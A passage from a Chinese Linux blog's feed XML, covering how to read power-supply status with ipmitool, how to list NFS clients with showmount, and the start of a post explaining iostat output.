90.000</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x540C;&#x6837;&#x9053;&#x7406;&#xFF0C;&#x53EF;&#x4EE5;&#x5C06;&#x72B6;&#x6001;&#x53D8;&#x6210;nr&#xFF0C;&#x53EA;&#x9700;&#x8981;&#x8BBE;&#x7F6E;&#x95E8;&#x9650;&#x4E3A;20 30 30 &#xFF0C;&#x5373;&#x53EF;&#x3002;</p><h2 id="&#x68C0;&#x67E5;&#x7535;&#x6E90;&#x6A21;&#x5757;&#x72B6;&#x6001;"><a href="#&#x68C0;&#x67E5;&#x7535;&#x6E90;&#x6A21;&#x5757;&#x72B6;&#x6001;" class="headerlink" title="&#x68C0;&#x67E5;&#x7535;&#x6E90;&#x6A21;&#x5757;&#x72B6;&#x6001;"></a>&#x68C0;&#x67E5;&#x7535;&#x6E90;&#x6A21;&#x5757;&#x72B6;&#x6001;</h2><p>&#x6211;&#x4EEC;&#x77E5;&#x9053;IPMI&#x5F88;&#x5F3A;&#x5927;&#xFF0C;&#x5982;&#x4F55;&#x5229;&#x7528;ipmitool&#x83B7;&#x53D6;&#x5230;&#x7535;&#x6E90;&#x7684;&#x5B9E;&#x65BD;&#x72B6;&#x6001;&#x7684;&#x3002;&#x73B0;&#x4EE3;&#x7684;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x57FA;&#x672C;&#x4E0A;&#x90FD;&#x6709;&#x4E24;&#x4E2A;&#x7535;&#x6E90;&#x6A21;&#x5757;&#xFF0C;&#x4F5C;&#x4E3A;&#x5197;&#x4F59;&#x3002;&#x5982;&#x4F55;&#x67E5;&#x770B;&#x7535;&#x6E90;&#x7684;&#x72B6;&#x6001;&#x4FE1;&#x606F;&#x5462;&#xFF0C;&#x662F;&#x5426;&#x6240;&#x6709;&#x7684;&#x7535;&#x6E90;&#x6A21;&#x5757;&#x90FD;&#x5DF2;&#x542F;&#x7528;&#xFF0C;&#x7535;&#x6E90;&#x662F;&#x5426;&#x90FD;&#x901A;&#x7535;&#xFF1F;</p><h3 id="&#x65B9;&#x6CD5;&#x4E00;"><a href="#&#x65B9;&#x6CD5;&#x4E00;" class="headerlink" title="&#x65B9;&#x6CD5;&#x4E00;"></a>&#x65B9;&#x6CD5;&#x4E00;</h3><h4 id="&#x901A;&#x8FC7;&#x5982;&#x4E0B;&#x6307;&#x4EE4;&#x53EF;&#x4EE5;&#x83B7;&#x53D6;&#x5230;&#x7535;&#x6E90;&#x7684;&#x72B6;&#x6001;&#x4FE1;&#x606F;&#xFF1A;"><a href="#&#x901A;&#x8FC7;&#x5982;&#x4E0B;&#x6307;&#x4EE4;&#x53EF;&#x4EE5;&#x83B7;&#x53D6;&#x5230;&#x7535;&#x6E90;&#x7684;&#x72B6;&#x6001;&#x4FE1;&#x606F;&#xFF1A;" class="headerlink" title="&#x901A;&#x8FC7;&#x5982;&#x4E0B;&#x6307;&#x4EE4;&#x53EF;&#x4EE5;&#x83B7;&#x53D6;&#x5230;&#x7535;&#x6E90;&#x7684;&#x72B6;&#x6001;&#x4FE1;&#x606F;&#xFF1A;"></a>&#x901A;&#x8FC7;&#x5982;&#x4E0B;&#x6307;&#x4EE4;&#x53EF;&#x4EE5;&#x83B7;&#x53D6;&#x5230;&#x7535;&#x6E90;&#x7684;&#x72B6;&#x6001;&#x4FE1;&#x606F;&#xFF1A;</h4><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipmitool sdr <span class="built_in">type</span> <span class="string">&quot;power supply&quot;</span></span><br></pre></td></tr></tbody></table></figure><p>&#x6B63;&#x5E38;&#x60C5;&#x51B5;&#x4E0B;&#x7535;&#x6E90;&#x7684;&#x72B6;&#x6001;&#x5982;&#x4E0B;&#x6240;&#x793A;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS1 Status       | C4h | ok  | 10.1 | Presence detected</span><br><span class="line">PS2 Status       | C5h | ok  | 10.2 | Presence detected</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x5982;&#x679C;&#xFF0C;&#x6211;&#x4EEC;&#x5C06;&#x5176;&#x4E2D;&#x4E00;&#x4E2A;&#x62D4;&#x6389;&#x7535;&#x6E90;&#x63D2;&#x5934;&#xFF0C;&#x72B6;&#x6001;&#x5C31;&#x4F1A;&#x5982;&#x4E0B;&#x6240;&#x793A;&#xFF1A;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS1 Status       | C4h | ok  | 10.1 | Presence detected</span><br><span class="line">PS2 Status       | C5h | ok  | 10.2 | Presence detected, Failure detected, Power Supply AC lost</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x5982;&#x679C;&#x6211;&#x4EEC;&#x5C06;&#x5176;&#x4E2D;&#x4E00;&#x4E2A;&#x7684;&#x7535;&#x6E90;&#x6A21;&#x5757;(PSU, power supply unit)&#x76F4;&#x63A5;&#x4ECE;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x62D4;&#x51FA;&#xFF0C;&#x72B6;&#x6001;&#x5C31;&#x4F1A;&#x5982;&#x4E0B;&#x6240;&#x793A;&#xFF1A;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS1 Status       | C4h | ok  | 10.1 | Presence detected</span><br><span class="line">PS2 Status       | C5h | ok  | 10.2 |</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x4E8B;&#x5B9E;&#x4E0A;&#x9664;&#x4E86;&#x4E0A;&#x9762;&#x7684;&#x51E0;&#x79CD;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipmitool sensor get <span class="string">&quot;PS1 Status&quot;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x67E5;&#x770B;&#x5176;&#x4ED6;&#x53EF;&#x80FD;&#x7684;&#x503C;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">Sensor ID              : PS1 Status (0xc4)</span><br><span class="line">Entity ID             : 10.1 (Power Supply)</span><br><span class="line">Sensor Type (Discrete): Power Supply (0x08)</span><br><span class="line">Sensor Reading        : 1h                    &lt;-------------&#x8FD9;&#x4E2A;&#x503C;&#x662F;&#x65B9;&#x6CD5;2&#x63D0;&#x5230;0x01 &#xFF0C;&#x5373;&#x6B63;&#x5E38;&#x72B6;&#x6001;</span><br><span class="line">Event Message Control : Per-threshold</span><br><span class="line">States Asserted       : Power Supply</span><br><span class="line">                        [Presence detected]</span><br><span class="line">Assertion Events      : Power Supply</span><br><span class="line">                        [Presence detected]</span><br><span class="line">Deassertion Events    : Power Supply</span><br><span class="line">                        [Failure detected]</span><br><span class="line">Assertions Enabled    : Power Supply</span><br><span class="line">                        [Failure detected]</span><br><span class="line">                        [Power Supply AC lost]</span><br><span class="line">                        [AC lost or out-of-range]</span><br><span class="line">                        [AC out-of-range, but present]</span><br><span class="line">                        [Config Error]</span><br><span class="line">Deassertions Enabled  : Power Supply</span><br><span class="line">                        [Failure detected]</span><br><span class="line">                        [Power Supply AC lost]</span><br><span class="line">                        [AC lost or out-of-range]</span><br><span class="line">                        [AC out-of-range, but present]</span><br><span class="line">                        [Config Error]</span><br><span class="line">OEM                   : 0</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="&#x65B9;&#x6CD5;&#x4E8C;"><a href="#&#x65B9;&#x6CD5;&#x4E8C;" class="headerlink" title="&#x65B9;&#x6CD5;&#x4E8C;"></a>&#x65B9;&#x6CD5;&#x4E8C;</h3><h4 id="&#x4ECE;&#x5982;&#x4E0B;&#x6307;&#x4EE4;&#x4E5F;&#x53EF;&#x4EE5;&#x83B7;&#x5F97;&#x7535;&#x6E90;&#x6A21;&#x5757;&#x7684;&#x4FE1;&#x606F;&#xFF1A;"><a href="#&#x4ECE;&#x5982;&#x4E0B;&#x6307;&#x4EE4;&#x4E5F;&#x53EF;&#x4EE5;&#x83B7;&#x5F97;&#x7535;&#x6E90;&#x6A21;&#x5757;&#x7684;&#x4FE1;&#x606F;&#xFF1A;" class="headerlink" title="&#x4ECE;&#x5982;&#x4E0B;&#x6307;&#x4EE4;&#x4E5F;&#x53EF;&#x4EE5;&#x83B7;&#x5F97;&#x7535;&#x6E90;&#x6A21;&#x5757;&#x7684;&#x4FE1;&#x606F;&#xFF1A;"></a>&#x4ECE;&#x5982;&#x4E0B;&#x6307;&#x4EE4;&#x4E5F;&#x53EF;&#x4EE5;&#x83B7;&#x5F97;&#x7535;&#x6E90;&#x6A21;&#x5757;&#x7684;&#x4FE1;&#x606F;&#xFF1A;</h4><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipmitool sensor list</span><br></pre></td></tr></tbody></table></figure><p>&#x8F93;&#x51FA;&#x5982;&#x4E0B;&#xFF1A;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS1 Status       | 0x1        | discrete   | 0x0100| na        | na        | na        | na        | na        | na        </span><br><span class="line">PS2 Status       | 0x1        | discrete   | 0x0100| na        | na        | na        | na        | na        | na</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x7B2C;&#x4E8C;&#x5217;&#x7684;&#x503C;&#x5F88;&#x6709;&#x610F;&#x601D;</p><ul><li>0x01 status ok&#xFF0C;&#x6700;&#x5E38;&#x89C1;&#x7684;&#x72B6;&#x6001;</li><li>0x00 power supply unit not present &#xFF0C;&#x5373;&#x7535;&#x6E90;&#x6A21;&#x5757;&#x4E0D;&#x5B58;&#x5728;&#xFF0C;&#x4E00;&#x822C;&#x7535;&#x6E90;&#x6A21;&#x5757;&#x4ECE;&#x670D;&#x52A1;&#x5668;&#x4E2D;&#x62D4;&#x51FA;&#xFF0C;&#x72B6;&#x6001;&#x662F;0x00</li><li>0x03 power supply off or failed&#xFF0C;&#x6211;&#x6CA1;&#x6709;&#x9047;&#x5230;&#x8FC7;&#x8FD9;&#x79CD;&#x72B6;&#x6001;&#xFF0C;&#x6211;&#x731C;&#x662F;&#x7535;&#x6E90;&#x6A21;&#x5757;&#x574F;&#x4E86;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x4F1A;&#x662F;&#x8FD9;&#x79CD;&#x72B6;&#x6001;</li><li>0x0b input out of range&#xFF08;ex. No AC input&#xFF09;&#x8FD9;&#x4E5F;&#x662F;&#x5F88;&#x5E38;&#x89C1;&#x7684;&#x72B6;&#x6001;&#xFF0C;&#x628A;&#x7535;&#x6E90;&#x7684;&#x63D2;&#x5934;&#x62D4;&#x6389;&#xFF0C;&#x5C31;&#x4F1A;&#x662F;&#x8FD9;&#x79CD;&#x72B6;&#x6001;&#x3002;</li></ul><p>&#x8FD9;&#x79CD;&#x65B9;&#x6CD5;&#x6BD4;&#x8F83;&#x597D;&#xFF0C;&#x4E2A;&#x4EBA;&#x6BD4;&#x8F83;&#x63A8;&#x8350;&#x8FD9;&#x79CD;&#x65B9;&#x6CD5;&#x3002;</p><h2 id="&#x53C2;&#x8003;&#x6587;&#x732E;"><a href="#&#x53C2;&#x8003;&#x6587;&#x732E;" class="headerlink" title="&#x53C2;&#x8003;&#x6587;&#x732E;"></a>&#x53C2;&#x8003;&#x6587;&#x732E;</h2><p><a href="https://support.hpe.com/hpsc/doc/public/display?docId=emr_na-sg8039en_us&amp;docLocale=en_US" target="_blank" rel="noopener">IPMItool Sometimes Fails to Detect Power Supply Failures on Rackable Nodes</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;&amp;#x524D;&amp;#x8A00;&quot;&gt;&lt;a href=&quot;#&amp;#x524D;&amp;#x8A00;&quot; class=&quot;headerlink&quot; title=&quot;&amp;#x524D;&amp;#x8A00;&quot;&gt;&lt;/a&gt;&amp;#x524D;&amp;#x8A00;&lt;/h2&gt;&lt;h4 id=&quot;ipmitool&amp;
      
    
    </summary>
    
      <category term="Linux" scheme="https://jiemin.wang/categories/Linux/"/>
    
    
      <category term="Linux" scheme="https://jiemin.wang/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>谁连了我的NFS目录</title>
    <link href="https://jiemin.wang/2019/03/11/showmount/"/>
    <id>https://jiemin.wang/2019/03/11/showmount/</id>
    <published>2019-03-11T12:59:28.000Z</published>
    <updated>2019-03-11T13:01:42.419Z</updated>
    
    <content type="html"><![CDATA[<h2 id="&#x524D;&#x8A00;"><a href="#&#x524D;&#x8A00;" class="headerlink" title="&#x524D;&#x8A00;"></a>&#x524D;&#x8A00;</h2><p>&#x6709;&#x4E9B;&#x65F6;&#x5019;&#xFF0C;&#x4F5C;&#x4E3A;NFS Server&#xFF0C;&#x9700;&#x8981;&#x4E86;&#x89E3;&#x54EA;&#x4E9B;client&#x7AEF;&#x8FDE;&#x4E86;&#x6211;&#x7684;NFS &#x76EE;&#x5F55;&#xFF0C;&#x8FD9;&#x65F6;&#x5019;&#xFF0C;showmount&#x547D;&#x4EE4;&#x5C31;&#x95EA;&#x4EAE;&#x767B;&#x573A;&#x4E86;&#x3002;</p><h2 id="&#x4F7F;&#x7528;&#x65B9;&#x6CD5;"><a href="#&#x4F7F;&#x7528;&#x65B9;&#x6CD5;" class="headerlink" title="&#x4F7F;&#x7528;&#x65B9;&#x6CD5;"></a>&#x4F7F;&#x7528;&#x65B9;&#x6CD5;</h2><p>showmount -a &#x53EF;&#x4EE5;&#x67E5;&#x770B;&#xFF0C;&#x5F53;&#x524D;&#x5230;&#x5E95;&#x6709;&#x54EA;&#x4E9B;client&#x8FDE;&#x63A5;&#x4E86;&#x672C;Server exports&#x7684;&#x76EE;&#x5F55;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@node <span class="comment"># showmount -a </span></span><br><span class="line">All mount points on Storage-b3:</span><br><span class="line">10.1.226.105:/var/share/ezfs/shareroot/mgt</span><br><span class="line">10.1.227.1:/var/share/ezfs/shareroot/backup</span><br><span class="line">10.1.227.201:/var/share/ezfs/shareroot/mgt</span><br><span class="line">10.1.227.2:/var/share/ezfs/shareroot/backup</span><br><span class="line">10.1.227.3:/var/share/ezfs/shareroot/backup</span><br><span class="line">10.1.227.81:/var/share/ezfs/shareroot/mgt</span><br><span class="line">10.1.227.85:/var/share/ezfs/shareroot/mgt</span><br><span class="line">10.1.232.199:/var/share/ezfs/shareroot/mgt</span><br></pre></td></tr></tbody></table></figure><p></p><h2 id="&#x5C3E;&#x58F0;"><a href="#&#x5C3E;&#x58F0;" class="headerlink" title="&#x5C3E;&#x58F0;"></a>&#x5C3E;&#x58F0;</h2><p>showmount&#x662F;&#x4E00;&#x4E2A;&#x6BD4;&#x8F83;&#x7EFC;&#x5408;&#x7684;&#x547D;&#x4EE4;&#xFF0C;&#x8FD8;&#x6709;&#x5F88;&#x591A;&#x5176;&#x5B83;&#x7684;&#x7528;&#x6CD5;&#x3002;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;man &#x67E5;&#x770B;&#x3002;</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;&amp;#x524D;&amp;#x8A00;&quot;&gt;&lt;a href=&quot;#&amp;#x524D;&amp;#x8A00;&quot; class=&quot;headerlink&quot; title=&quot;&amp;#x524D;&amp;#x8A00;&quot;&gt;&lt;/a&gt;&amp;#x524D;&amp;#x8A00;&lt;/h2&gt;&lt;p&gt;&amp;#x6709;&amp;#x4E9
      
    
    </summary>
    
      <category term="Linux" scheme="https://jiemin.wang/categories/Linux/"/>
    
    
      <category term="Linux" scheme="https://jiemin.wang/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>深入理解iostat</title>
    <link href="https://jiemin.wang/2019/03/11/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3iostat/"/>
    <id>https://jiemin.wang/2019/03/11/深入理解iostat/</id>
    <published>2019-03-11T11:29:30.000Z</published>
    <updated>2019-03-11T12:29:06.954Z</updated>
    
    <content type="html"><![CDATA[<h2 id="&#x524D;&#x8A00;"><a href="#&#x524D;&#x8A00;" class="headerlink" title="&#x524D;&#x8A00;"></a>&#x524D;&#x8A00;</h2><h3 id="iostat&#x7B97;&#x662F;&#x6BD4;&#x8F83;&#x91CD;&#x8981;&#x7684;&#x67E5;&#x770B;&#x5757;&#x8BBE;&#x5907;&#x8FD0;&#x884C;&#x72B6;&#x6001;&#x7684;&#x5DE5;&#x5177;&#xFF0C;&#x76F8;&#x4FE1;&#x5927;&#x591A;&#x6570;&#x4F7F;&#x7528;Linux&#x7684;&#x540C;&#x5B66;&#x90FD;&#x7528;&#x8FC7;&#x8FD9;&#x4E2A;&#x5DE5;&#x5177;&#xFF0C;&#x6216;&#x8005;&#x542C;&#x8BF4;&#x8FC7;&#x8FD9;&#x4E2A;&#x5DE5;&#x5177;&#x3002;&#x4F46;&#x662F;&#x5BF9;&#x4E8E;&#x8FD9;&#x4E2A;&#x5DE5;&#x5177;&#xFF0C;&#x5F15;&#x8D77;&#x7684;&#x8BEF;&#x89E3;&#x4E5F;&#x662F;&#x6700;&#x591A;&#x7684;&#xFF0C;&#x5927;&#x591A;&#x6570;&#x4EBA;&#x5BF9;&#x8FD9;&#x4E2A;&#x5DE5;&#x5177;&#x5904;&#x4E8E;&#x6726;&#x6726;&#x80E7;&#x80E7;&#x7684;&#x72B6;&#x6001;&#x3002;&#x73B0;&#x5728;&#x6211;&#x4EEC;&#x7531;&#x6D45;&#x5230;&#x6DF1;&#x5730;&#x4ECB;&#x7ECD;&#x8FD9;&#x4E2A;&#x5DE5;&#x5177;&#xFF0C;&#x5B83;&#x8F93;&#x51FA;&#x7684;&#x542B;&#x4E49;&#x4EC0;&#x4E48;&#xFF0C;&#x4ECB;&#x7ECD;&#x5B83;&#x7684;&#x80FD;&#x529B;&#x8FB9;&#x754C;&#xFF0C;&#x4ECB;&#x7ECD;&#x5173;&#x4E8E;&#x8FD9;&#x4E2A;&#x5DE5;&#x5177;&#x7684;&#x5E38;&#x89C1;&#x8BEF;&#x89E3;&#x3002;"><a href="#iostat&#x7B97;&#x662F;&#x6BD4;&#x8F83;&#x91CD;&#x8981;&#x7684;&#x67E5;&#x770B;&#x5757;&#x8BBE;&#x5907;&#x8FD0;&#x884C;&#x72B6;&#x6001;&#x7684;&#x5DE5;&#x5177;&#xFF0C;&#x76F8;&#x4FE1;&#x5927;&#x591A;&#x6570;&#x4F7F;&#x7528;Linux&#x7684;&#x540C;&#x5B66;&#x90FD;&#x7528;&#x8FC7;&#x8FD9;&#x4E2A;&#x5DE5;&#x5177;&#xFF0C;&#x6216;&#x8005;&#x542C;&#x8BF4;&#x8FC7;&#x8FD9;&#x4E2A;&#x5DE5;&#x5177;&#x3002;&#x4F46;&#x662F;&#x5BF9;&#x4E8E;&#x8FD9;&#x4E2A;&#x5DE5;&#x5177;&#xFF0C;&#x5F15;&#x8D77;&#x7684;&#x8BEF;&#x89E3;&#x4E5F;&#x662F;&#x6700;&#x591A;&#x7684;&#xFF0C;&#x5927;&#x591A;&#x6570;&#x4EBA;&#x5BF9;&#x8FD9;&#x4E2A;&#x5DE5;&#x5177;&#x5904;&#x4E8E;&#x6726;&#x6726;&#x80E7;&#x80E7;&#x7684;&#x72B6;&#x6001;&#x3002;&#x73B0;&#x5728;&#x6211;&#x4EEC;&#x7531;&#x6D45;&#x5230;&#x6DF1;&#x5730;&#x4ECB;&#x7ECD;&#x8FD9;&#x4E2A;&#x5DE5;&#x5177;&#xFF0C;&#x5B83;&#x8F93;&#x51FA;&#x7684;&#x542B;&#x4E49;&#x4EC0;&#x4E48;&#xFF0C;&#x4ECB;&#x7ECD;&#x5B83;&#x7684;&#x80FD;&#x529B;&#x8FB9;&#x754C;&#xFF0C;&#x4ECB;&#x7ECD;&#x5173;&#x4E8E;&#x8FD9;&#x4E2A;&#x5DE5;&#x5177;&#x7684;&#x5E38;&#x89C1;&#x8BEF;&#x89E3;&#x3002;" class="headerlink" title="iostat&#x7B97;&#x662F;&#x6BD4;&#x8F83;&#x91CD;&#x8981;&#x7684;&#x67E5;&#x770B;&#x5757;&#x8BBE;&#x5907;&#x8FD0;&#x884C;&#x72B6;&#x6001;&#x7684;&#x5DE5;&#x5177;&#xFF0C;&#x76F8;&#x4FE1;&#x5927;&#x591A;&#x6570;&#x4F7F;&#x7528;Linux&#x7684;&#x540C;&#x5B66;&#x90FD;&#x7528;&#x8FC7;&#x8FD9;&#x4E2A;&#x5DE5;&#x5177;&#xFF0C;&#x6216;&#x8005;&#x542C;&#x8BF4;&#x8FC7;&#x8FD9;&#x4E2A;&#x5DE5;&#x5177;&#x3002;&#x4F46;&#x662F;&#x5BF9;&#x4E8E;&#x8FD9;&#x4E2A;&#x5DE5;&#x5177;&#xFF0C;&#x5F15;&#x8D77;&#x7684;&#x8BEF;&#x89E3;&#x4E5F;&#x662F;&#x6700;&#x591A;&#x7684;&#xFF0C;&#x5927;&#x591A;&#x6570;&#x4EBA;&#x5BF9;&#x8FD9;&#x4E2A;&#x5DE5;&#x5177;&#x5904;&#x4E8E;&#x6726;&#x6726;&#x80E7;&#x80E7;&#x7684;&#x72B6;&#x6001;&#x3002;&#x73B0;&#x5728;&#x6211;&#x4EEC;&#x7531;&#x6D45;&#x5230;&#x6DF1;&#x5730;&#x4ECB;&#x7ECD;&#x8FD9;&#x4E2A;&#x5DE5;&#x5177;&#xFF0C;&#x5B83;&#x8F93;&#x51FA;&#x7684;&#x542B;&#x4E49;&#x4EC0;&#x4E48;&#xFF0C;&#x4ECB;&#x7ECD;&#x5B83;&#x7684;&#x80FD;&#x529B;&#x8FB9;&#x754C;&#xFF0C;&#x4ECB;&#x7ECD;&#x5173;&#x4E8E;&#x8FD9;&#x4E2A;&#x5DE5;&#x5177;&#x7684;&#x5E38;&#x89C1;&#x8BEF;&#x89E3;&#x3002;"></a>iostat&#x7B97;&#x662F;&#x6BD4;&#x8F83;&#x91CD;&#x8981;&#x7684;&#x67E5;&#x770B;&#x5757;&#x8BBE;&#x5907;&#x8FD0;&#x884C;&#x72B6;&#x6001;&#x7684;&#x5DE5;&#x5177;&#xFF0C;&#x76F8;&#x4FE1;&#x5927;&#x591A;&#x6570;&#x4F7F;&#x7528;Linux&#x7684;&#x540C;&#x5B66;&#x90FD;&#x7528;&#x8FC7;&#x8FD9;&#x4E2A;&#x5DE5;&#x5177;&#xFF0C;&#x6216;&#x8005;&#x542C;&#x8BF4;&#x8FC7;&#x8FD9;&#x4E2A;&#x5DE5;&#x5177;&#x3002;&#x4F46;&#x662F;&#x5BF9;&#x4E8E;&#x8FD9;&#x4E2A;&#x5DE5;&#x5177;&#xFF0C;&#x5F15;&#x8D77;&#x7684;&#x8BEF;&#x89E3;&#x4E5F;&#x662F;&#x6700;&#x591A;&#x7684;&#xFF0C;&#x5927;&#x591A;&#x6570;&#x4EBA;&#x5BF9;&#x8FD9;&#x4E2A;&#x5DE5;&#x5177;&#x5904;&#x4E8E;&#x6726;&#x6726;&#x80E7;&#x80E7;&#x7684;&#x72B6;&#x6001;&#x3002;&#x73B0;&#x5728;&#x6211;&#x4EEC;&#x7531;&#x6D45;&#x5230;&#x6DF1;&#x5730;&#x4ECB;&#x7ECD;&#x8FD9;&#x4E2A;&#x5DE5;&#x5177;&#xFF0C;&#x5B83;&#x8F93;&#x51FA;&#x7684;&#x542B;&#x4E49;&#x4EC0;&#x4E48;&#xFF0C;&#x4ECB;&#x7ECD;&#x5B83;&#x7684;&#x80FD;&#x529B;&#x8FB9;&#x754C;&#xFF0C;&#x4ECB;&#x7ECD;&#x5173;&#x4E8E;&#x8FD9;&#x4E2A;&#x5DE5;&#x5177;&#x7684;&#x5E38;&#x89C1;&#x8BEF;&#x89E3;&#x3002;</h3><h2 id="&#x57FA;&#x672C;&#x7528;&#x6CD5;&#x548C;&#x8F93;&#x51FA;&#x7684;&#x57FA;&#x672C;&#x542B;&#x4E49;"><a href="#&#x57FA;&#x672C;&#x7528;&#x6CD5;&#x548C;&#x8F93;&#x51FA;&#x7684;&#x57FA;&#x672C;&#x542B;&#x4E49;" class="headerlink" title="&#x57FA;&#x672C;&#x7528;&#x6CD5;&#x548C;&#x8F93;&#x51FA;&#x7684;&#x57FA;&#x672C;&#x542B;&#x4E49;"></a>&#x57FA;&#x672C;&#x7528;&#x6CD5;&#x548C;&#x8F93;&#x51FA;&#x7684;&#x57FA;&#x672C;&#x542B;&#x4E49;</h2><h4 id="iostat&#x7684;&#x7528;&#x6CD5;&#x6BD4;&#x8F83;&#x7B80;&#x5355;&#xFF0C;&#x4E00;&#x822C;&#x6765;&#x8BF4;&#x7528;&#x6CD5;&#x5982;&#x4E0B;&#xFF1A;"><a href="#iostat&#x7684;&#x7528;&#x6CD5;&#x6BD4;&#x8F83;&#x7B80;&#x5355;&#xFF0C;&#x4E00;&#x822C;&#x6765;&#x8BF4;&#x7528;&#x6CD5;&#x5982;&#x4E0B;&#xFF1A;" class="headerlink" title="iostat&#x7684;&#x7528;&#x6CD5;&#x6BD4;&#x8F83;&#x7B80;&#x5355;&#xFF0C;&#x4E00;&#x822C;&#x6765;&#x8BF4;&#x7528;&#x6CD5;&#x5982;&#x4E0B;&#xFF1A;"></a>iostat&#x7684;&#x7528;&#x6CD5;&#x6BD4;&#x8F83;&#x7B80;&#x5355;&#xFF0C;&#x4E00;&#x822C;&#x6765;&#x8BF4;&#x7528;&#x6CD5;&#x5982;&#x4E0B;&#xFF1A;</h4><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iostat -mtx 2</span><br></pre></td></tr></tbody></table></figure><h6 id="&#x542B;&#x4E49;&#x662F;&#x8BF4;&#xFF0C;&#x6BCF;2&#x79D2;&#x949F;&#x91C7;&#x96C6;&#x4E00;&#x7EC4;&#x6570;&#x636E;&#xFF1A;"><a href="#&#x542B;&#x4E49;&#x662F;&#x8BF4;&#xFF0C;&#x6BCF;2&#x79D2;&#x949F;&#x91C7;&#x96C6;&#x4E00;&#x7EC4;&#x6570;&#x636E;&#xFF1A;" class="headerlink" title="&#x542B;&#x4E49;&#x662F;&#x8BF4;&#xFF0C;&#x6BCF;2&#x79D2;&#x949F;&#x91C7;&#x96C6;&#x4E00;&#x7EC4;&#x6570;&#x636E;&#xFF1A;"></a>&#x542B;&#x4E49;&#x662F;&#x8BF4;&#xFF0C;&#x6BCF;2&#x79D2;&#x949F;&#x91C7;&#x96C6;&#x4E00;&#x7EC4;&#x6570;&#x636E;&#xFF1A;</h6><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-m     Display statistics <span class="keyword">in</span> megabytes per second.</span><br><span class="line">-t     Print the time <span class="keyword">for</span> each report displayed. The timestamp format may depend on the value of the S_TIME_FORMAT environment variable (see below).</span><br><span class="line">-x     Display extended statistics.</span><br></pre></td></tr></tbody></table></figure><h6 id="&#x8F93;&#x51FA;&#x7684;&#x7ED3;&#x679C;&#x5982;&#x4E0B;&#x6240;&#x793A;&#xFF1A;"><a href="#&#x8F93;&#x51FA;&#x7684;&#x7ED3;&#x679C;&#x5982;&#x4E0B;&#x6240;&#x793A;&#xFF1A;" class="headerlink" title="&#x8F93;&#x51FA;&#x7684;&#x7ED3;&#x679C;&#x5982;&#x4E0B;&#x6240;&#x793A;&#xFF1A;"></a>&#x8F93;&#x51FA;&#x7684;&#x7ED3;&#x679C;&#x5982;&#x4E0B;&#x6240;&#x793A;&#xFF1A;</h6><img src="/2019/03/11/&#x6DF1;&#x5165;&#x7406;&#x89E3;iostat/single_disk_randw_4k_iops_5000_t.png" title="single_disk_randw_4k_iops_5000_t"><h6 